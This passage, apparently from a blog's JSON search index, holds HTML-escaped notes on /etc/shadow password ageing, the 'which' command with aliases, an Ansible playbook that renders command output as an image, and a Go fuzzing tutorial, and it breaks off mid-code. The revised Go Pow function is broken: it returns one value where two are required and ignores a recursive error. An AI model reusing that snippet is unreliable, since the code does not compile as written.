style=\"display:flex;\"\u003e\u003cspan\u003ePassword expires                                        : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword inactive                                       : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccount expires                                         : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMinimum number of days between password change          : \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMaximum number of days between password change          : \u003cspan style=\"color:#ae81ff\"\u003e99999\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNumber of days of warning before password expires       : \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eConsequently, we can change any field via its associated flag:\u003c/p\u003e","tags":["URL","Linux","SHELL","command line"],"title":"/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes"},{"categories":["URL","Linux","SHELL","command line"],"contents":" How to Use which on an Aliased Command type type grep grep is an alias for grep --color=auto # Bash\u0026#39;s type type -P grep /usr/bin/grep # Zsh\u0026#39;s type type -p grep grep is /usr/bin/grep GNU which which -a which which: shell built-in command /usr/bin/which alias top10 top10=\u0026#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39; alias | /usr/bin/which -i top10 top10=\u0026#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39; /usr/bin/uniq /usr/bin/sort /usr/bin/head ","date":"November 10, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221110-which-on-an-aliased-command/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/which-on-an-aliased-command\" target=\"_blank\" rel=\"noopener\"\u003eHow to Use which on an Aliased Command\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"type\"\u003etype\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrep is an alias \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e grep --color\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eauto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Bash\u0026#39;s type\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype -P grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/usr/bin/grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Zsh\u0026#39;s type\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype -p grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrep is /usr/bin/grep\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gnu-which\"\u003eGNU which\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhich -a which\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhich: shell built-in command\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/usr/bin/which\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ealias top10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etop10\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;print -l  ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ealias | /usr/bin/which -i top10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etop10\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;print -l  ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/uniq\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/sort\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/head\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","SHELL","command line"],"title":"How to Use which on an Aliased Command"},{"categories":["URL","Ansible"],"contents":" 將指令輸出轉為圖片 --- - name: Capture command output and convert to image hosts: all tasks: - name: Display content of /etc/redhat-release shell: cat /etc/redhat-release register: redhat_release_result - name: hostname shell: hostname register: hostname_result # 可以使用 ImageMagick 來轉換文字為圖片 - name: Convert command output as image shell: echo -e \u0026#34;{{ hostname_result.stdout }}\\n{{ redhat_release_result.stdout }}\u0026#34; | convert label:@- {{ hostname_result.stdout }}.png delegate_to: localhost ","date":"November 10, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221110-tip-command-output-to-image/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/tips/tip-command-output-to-image/\" target=\"_blank\" rel=\"noopener\"\u003e將指令輸出轉為圖片\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCapture command output and convert to image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eDisplay content of /etc/redhat-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ecat /etc/redhat-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eredhat_release_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 可以使用 ImageMagick 來轉換文字為圖片\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eConvert command output as image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eecho -e \u0026#34;{{ hostname_result.stdout }}\\n{{ redhat_release_result.stdout }}\u0026#34; | convert label:@- {{ hostname_result.stdout }}.png\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edelegate_to\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003elocalhost\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible"],"title":"將指令輸出轉為圖片"},{"categories":["URL","Go","Testing"],"contents":" 善用 Go Fuzzing，幫助你寫出更完整的單元測試 func Pow(base uint, exponent uint) uint { if exponent == 0 { return 1 } return base * Pow(base, exponent-1) } func FuzzPow(f *testing.F) { f.Fuzz(func(t *testing.T, x, y uint) { assert := assert.New(t) assert.Equal(Pow(x, 0), uint(1)) assert.Equal(Pow(x, 1), x) assert.Equal(Pow(x, 2), x*x) if x \u0026gt; 0 \u0026amp;\u0026amp; y \u0026gt; 0 { assert.Equal(Pow(x, y)/x, Pow(x, y-1)) } }) } go test -fuzz=Fuzz -fuzztime 20s\n在做 Fuzzing Test 的時候如果跑一跑 FAIL 了，Go 會幫忙把那組 input 記在 testcase/ 裡面 看了之後會發現在 x=6、y=30 時 assert 會失敗，也就是說 pow(6, 30)/6 不會等於 pow(6, 29)。但這也太奇怪了吧？仔細實驗之後才發現是因為在計算 pow(6, 30) 的時候會發生 overflow。 因為 Go 定義的 max.MaxUint 大約是 18 * 10¹⁸，但 6²⁹ 大概是 7 * 10¹⁸。如果把 6²⁹ 再乘上 6，就會發生 overflow 得到 8 * 10¹⁸，很像繞了操場兩圈結果在跟原本差不多的位置。 var ErrOverflow = fmt.Errorf(\u0026#34;overflow\u0026#34;) func Pow(base uint, exponent uint) (uint, error) { if exponent == 0 { return 1 } prevResult, err := Pow(base, exponent-1) if math.MaxUint/base \u0026lt; prevResult { return 0, ErrOverflow } return base * prevResult, nil } func FuzzPow(f *testing.F) { f.Fuzz(func(t *testing.T, x, y uint) { assert := assert.New(t) if result, err := Pow(x, 1); err != ErrOverflow { assert.Equal(result, x) } if result, err := Pow(x, y); x \u0026gt; 0 \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; err != ErrOverflow { resultDivX, _ := Pow(x, y-1) assert.Equal(result/x, resultDivX) } }) } ","date":"November 3, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221103-utilize-go-fuzzing-to-write-better-unit-tests/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/utilize-go-fuzzing-to-write-better-unit-tests-80bd37cd4e38\" target=\"_blank\" rel=\"noopener\"\u003e善用 Go Fuzzing，幫助你寫出更完整的單元測試\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFuzzPow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eF\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFuzz\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e), uint(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ego test -fuzz=Fuzz -fuzztime 20s\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在做 Fuzzing Test 的時候如果跑一跑 FAIL 了，Go 會幫忙把那組 input 記在 testcase/ 裡面\u003c/li\u003e\n\u003cli\u003e看了之後會發現在 x=6、y=30 時 assert 會失敗，也就是說 pow(6, 30)/6 不會等於 pow(6, 29)。但這也太奇怪了吧？仔細實驗之後才發現是因為在計算 pow(6, 30) 的時候會發生 overflow。\u003c/li\u003e\n\u003cli\u003e因為 Go 定義的 max.MaxUint 大約是 18 * 10¹⁸，但 6²⁹ 大概是 7 * 10¹⁸。如果把 6²⁹ 再乘上 6，就會發生 overflow 得到 8 * 10¹⁸，很像繞了操場兩圈結果在跟原本差不多的位置。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;overflow\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) (\u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMaxUint\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFuzzPow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eF\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFuzz\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) 